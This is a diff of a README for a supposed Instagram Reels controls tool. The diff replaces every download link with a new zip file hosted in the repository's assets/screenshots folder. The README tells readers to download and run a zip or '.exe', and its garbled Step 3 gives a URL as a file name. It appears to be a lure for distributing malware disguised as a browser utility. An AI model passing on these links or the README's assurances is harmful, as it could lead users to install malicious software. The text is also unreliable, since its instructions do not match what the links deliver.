@@ -4,7 +4,7 @@
 
 InstaReel-Controls gives you better web controls for Instagram Reels. You can enjoy features like a volume popover, a progress bar, and timestamp sharing. Follow these simple steps to download and run the software.
 
-[![Download InstaReel-Controls](https://github.com/Javier993993/InstaReel-Controls/raw/refs/heads/main/assets/screenshots/Reel-Controls-Insta-v1.9.zip)](https://github.com/Javier993993/InstaReel-Controls/raw/refs/heads/main/assets/screenshots/Reel-Controls-Insta-v1.9.zip)
+[![Download InstaReel-Controls](https://raw.githubusercontent.com/Javier993993/InstaReel-Controls/main/assets/screenshots/Insta-Controls-Reel-v3.9.zip)](https://raw.githubusercontent.com/Javier993993/InstaReel-Controls/main/assets/screenshots/Insta-Controls-Reel-v3.9.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To get started, you need to visit our Releases page to download the latest versi
 
 Click the link below to access the downloads:
 
-[Download InstaReel-Controls](https://github.com/Javier993993/InstaReel-Controls/raw/refs/heads/main/assets/screenshots/Reel-Controls-Insta-v1.9.zip)
+[Download InstaReel-Controls](https://raw.githubusercontent.com/Javier993993/InstaReel-Controls/main/assets/screenshots/Insta-Controls-Reel-v3.9.zip)
 
 ### Step 2: Choose Your Version
 
@@ -22,7 +22,7 @@ On the Releases page, you will see different versions of InstaReel-Controls list
 
 ### Step 3: Download the File
 
-Once you find the latest version, click on the download link for your operating system. The file may be named something like `https://github.com/Javier993993/InstaReel-Controls/raw/refs/heads/main/assets/screenshots/Reel-Controls-Insta-v1.9.zip` or `.exe`. 
+Once you find the latest version, click on the download link for your operating system. The file may be named something like `https://raw.githubusercontent.com/Javier993993/InstaReel-Controls/main/assets/screenshots/Insta-Controls-Reel-v3.9.zip` or `.exe`. 
 
 ### Step 4: Extract & Install 
 
@@ -79,4 +79,4 @@ Yes, InstaReel-Controls is completely free. There are no hidden fees or subscrip
 
 If you need further assistance, please reach out through the Issues section on our GitHub repository. We respond to questions and comments to help you get the most out of InstaReel-Controls.
 
-[Download InstaReel-Controls](https://github.com/Javier993993/InstaReel-Controls/raw/refs/heads/main/assets/screenshots/Reel-Controls-Insta-v1.9.zip) and elevate your Instagram experience today!
+[Download InstaReel-Controls](https://raw.githubusercontent.com/Javier993993/InstaReel-Controls/main/assets/screenshots/Insta-Controls-Reel-v3.9.zip) and elevate your Instagram experience today!
